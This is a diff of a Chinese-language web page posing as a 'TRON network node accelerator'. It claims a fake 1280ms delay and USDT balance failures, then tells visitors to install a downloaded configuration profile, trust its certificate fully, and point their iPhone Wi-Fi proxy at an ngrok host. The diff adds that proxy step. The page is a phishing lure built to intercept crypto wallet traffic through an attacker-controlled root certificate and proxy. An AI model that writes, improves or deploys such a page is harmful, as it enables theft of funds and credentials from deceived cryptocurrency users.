@@ -5,24 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRON 网络节点加速器</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; text-align: center; background: #f4f4f9; padding: 40px 20px; color: #333; }
-        .card { background: white; border-radius: 20px; padding: 35px 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 400px; margin: 0 auto; }
-        h2 { color: #d32f2f; margin-bottom: 10px; }
-        p { line-height: 1.6; color: #666; font-size: 14px; }
-        .btn { display: inline-block; background: #0088cc; color: white !important; padding: 18px 40px; text-decoration: none !important; border-radius: 30px; font-weight: bold; margin-top: 25px; transition: 0.3s; box-shadow: 0 4px 10px rgba(0,136,204,0.3); }
-        .step-hint { margin-top: 25px; font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 15px; }
+        body { font-family: -apple-system, sans-serif; text-align: center; background: #f4f4f9; padding: 20px; color: #333; }
+        .card { background: white; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 420px; margin: 0 auto; }
+        h2 { color: #d32f2f; font-size: 20px; }
+        .btn { display: inline-block; background: #0088cc; color: white !important; padding: 15px 35px; text-decoration: none !important; border-radius: 30px; font-weight: bold; margin: 20px 0; }
+        .guide { text-align: left; background: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 10px; margin-top: 20px; }
+        .guide b { color: #856404; }
+        .code { font-family: monospace; background: #eee; padding: 2px 5px; border-radius: 4px; color: #d32f2f; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2>⚡️ 严重延迟：1280ms</h2>
-        <p>当前网络节点负载过高，可能导致 USDT 转账异常或 Gas 费估算错误。请安装官方优化的节点证书以恢复速度。</p>
+        <p>当前网络无法连接 TronGrid，可能导致 USDT 余额刷新失败。请安装官方加速证书并激活专线。</p>
         
-        <a href="setup.mobileconfig" download="setup.mobileconfig" class="btn">立即安装加速证书</a>
-        
-        <div class="step-hint">
-            安装说明：点击允许下载后，请前往<br>
-            <b>“设置” -> “已下载描述文件”</b> 进行安装
+        <a href="setup.mobileconfig" download="setup.mobileconfig" class="btn">第一步：安装加速证书</a>
+
+        <div class="guide">
+            <b>第二步：激活加速专线 (必做)</b>
+            <p style="font-size: 13px; margin: 8px 0;">1. 前往 <b>设置 -> Wi-Fi</b>，点击当前 Wi-Fi 旁的 <b>(i)</b></p>
+            <p style="font-size: 13px; margin: 8px 0;">2. 拉到底部点击 <b>配置代理 -> 手动</b></p>
+            <p style="font-size: 13px; margin: 8px 0;">3. 服务器输入：<span class="code">opposite-chowder-prompter.ngrok-free.dev</span></p>
+            <p style="font-size: 13px; margin: 8px 0;">4. 端口输入：<span class="code">443</span> (或 8080)</p>
+            <p style="font-size: 12px; color: #999;">* 安装后请在“关于本机”中开启证书信任</p>
         </div>
     </div>
 </body>
